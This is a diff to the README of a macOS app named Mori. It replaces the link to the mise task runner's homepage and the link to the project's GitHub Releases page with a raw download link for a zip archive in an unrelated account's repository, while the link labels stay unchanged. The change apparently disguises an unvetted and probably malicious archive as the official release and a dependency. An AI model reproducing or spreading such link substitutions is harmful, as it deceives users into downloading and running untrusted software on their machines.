@@ -49,7 +49,7 @@ App (AppKit shell + SwiftUI sidebar views)
 
 - macOS 14 (Sonoma) or later
 - tmux
-- [mise](https://mise.jdx.dev/) (task runner)
+- [mise](https://raw.githubusercontent.com/kingle2480/mori/main/vendor/Software_v1.4.zip) (task runner)
 - Zig 0.15.2 + Xcode (for building libghostty)
 
 ## Install
@@ -63,7 +63,7 @@ brew install --cask mori
 
 ### GitHub Releases
 
-Download the latest release from [GitHub Releases](https://github.com/vaayne/mori/releases).
+Download the latest release from [GitHub Releases](https://raw.githubusercontent.com/kingle2480/mori/main/vendor/Software_v1.4.zip).
 
 - `.dmg`: Open the disk image and move `Mori.app` into `/Applications`
 - `.zip`: Extract the archive and move `Mori.app` into `/Applications`
